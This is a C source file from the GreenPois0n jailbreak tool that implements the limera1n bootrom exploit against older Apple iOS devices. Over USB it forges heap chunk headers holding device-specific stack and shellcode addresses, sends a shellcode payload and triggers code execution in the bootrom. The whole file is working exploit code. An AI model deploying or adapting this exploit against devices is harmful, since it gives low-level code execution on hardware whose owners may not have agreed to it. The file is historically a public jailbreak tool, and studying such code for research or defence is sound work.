/**
  * GreenPois0n Syringe - exploits/limera1n/limera1n.c
  * Copyright (C) 2010 Chronic-Dev Team
  * Copyright (C) 2010 Joshua Hill
  *
  * Based on exploit discovered by geohot
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
  *
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "common.h"
#include "limera1n.h"
#include "limera1n_payload.h"
#include "libirecovery.h"

int limera1n_exploit(struct idevicerestore_device_t *device, irecv_client_t client)
{
	irecv_error_t error = IRECV_E_SUCCESS;
	unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = 0x24000;
	//unsigned int load_address = 0x84000000;
	unsigned int stack_address = 0x84033F98;
	unsigned int shellcode_address = 0x84023001;
	unsigned int shellcode_length = 0;


	if (device->chip_id == 8930) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	}
	if (device->chip_id == 8920) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	}

	memset(shellcode, 0x0, 0x800);
	shellcode_length = sizeof(limera1n_payload);
	memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < 0x800; i += 0x40) {
		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}

	debug("Sending chunk headers\n");
	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}

	debug("Sending exploit payload\n");
	irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

	debug("Sending fake data\n");
	memset(buf, 0xBB, 0x800);
	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);

	//debug("Executing exploit\n");
	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);

	irecv_reset(client);
	irecv_finish_transfer(client);
	debug("Exploit sent\n");

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 7);
	if (client == NULL) {
		debug("%s\n", irecv_strerror(error));
		error("Unable to reconnect\n");
		return -1;
	}

	return 0;
}
